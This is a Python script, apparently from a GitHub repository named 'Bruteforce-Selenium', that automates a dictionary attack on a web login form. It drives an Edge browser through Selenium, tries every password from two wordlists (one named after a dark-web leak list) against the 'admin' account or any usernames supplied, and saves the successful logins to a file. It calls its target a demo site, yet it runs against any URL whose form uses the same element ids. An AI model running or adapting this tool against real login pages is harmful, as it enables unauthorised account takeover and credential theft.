#https://github.com/EkaanshArora/Bruteforce-Selenium/blob/master/main.py

import argparse

parser = argparse.ArgumentParser(description='Bruteforce Demo site')
parser.add_argument('url', type=str,
                    help='base URL of compatible demo site')
parser.add_argument('--username', dest='usernames', default="admin", nargs='*',
                    help='one or more usernames to use')

args = parser.parse_args()

debug = False

url = args.url
print("Using URL ", url)

if url.endswith("/"):
    url = url[:-1]

loginUrl = url + "/login"
logoutUrl = url + "/logout"

usernames = args.usernames
print("Using usernames ", usernames)

import time
import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains

class element_has_message_or_spinner(object):
  """An expectation for checking that an element has a particular css class.

  locator - used to find the element
  returns the WebElement once it has the particular css class
  """
  def __init__(self):
    pass

  def __call__(self, driver):
    if "Username or password is incorrect" in driver.page_source:
        return True
    if "You're logged in" in driver.page_source:
        return True
    return False

passwords = []

curuser = ''

passwordfiles = ["dictionary.txt", "darkweb2017-top30.txt"]
for passwordfile in passwordfiles:
    with open(passwordfile, 'r') as f:
        print("Loading passwords from ", passwordfile)
        passwords.extend(f.read().splitlines())


def loginuserpass(driver: webdriver, usernameStr, passw):
    global debug
    username = driver.find_element_by_id("inputusername")
    username.clear()
    print("username: " + usernameStr)
    username.send_keys(usernameStr)
    password = driver.find_element_by_id("inputpassword")
    password.clear()
    print("password: " + passw + "\n")
    password.send_keys(passw)
    # driver.find_element_by_xpath("//input[@id='inputUsername']/ancestor::form/descendant::button[@type='submit']").click()
    currentlyShowingErrorMessage = False
    if "Username or password is incorrect" in driver.page_source:
        currentlyShowingErrorMessage = True
    driver.find_element_by_id("inputsubmit").click()
    driver.find_element_by_id("inputsubmit").click()
    if currentlyShowingErrorMessage:
        if debug:
            print("Waiting for alert-danger to disappear")
        WebDriverWait(driver, 30).until(
            EC.invisibility_of_element((By.CLASS_NAME, "alert-danger"))  # This is a dummy element
        )
    if debug:
        print("Waiting for spinner to disappear")
    WebDriverWait(driver, 30).until(
        EC.invisibility_of_element((By.ID, "spinner"))  # This is a dummy element
    )
    if debug:
        print("Waiting for error or success message")
    WebDriverWait(driver, 30).until(
        element_has_message_or_spinner()
    )
    # print("Spinner is here")
    # WebDriverWait(driver, 30).until_not(
    #     EC.presence_of_element_located((By.ID, "spinner"))  # This is a dummy element
    # )
    # print("Spinner is gone")


driver = webdriver.Edge(executable_path=r'msedgedriver.exe')
driver.get(loginUrl)

WebDriverWait(driver, 30).until(
    EC.presence_of_element_located((By.ID, "inputusername")) #This is a dummy element
)

for usernameI in range(len(usernames)):
    for i in range(len(passwords)):
        if driver.find_elements_by_id("inputusername"):
            loginuserpass(driver, usernames[usernameI], passwords[i])
            i += 1
        elif "You're logged in" in driver.page_source:
            print("SUCCESS")
            f3 = open('results.txt', 'w')
            f3.write(loginUrl + " " + usernames[usernameI] + " " + passwords[i] + '\n');
            f3.close()
            driver.get(logoutUrl)
            usernameI += 1
            break;
        else:
            time.sleep(.2)


print("You'll find all successfull logins in results.txt")
driver.close()
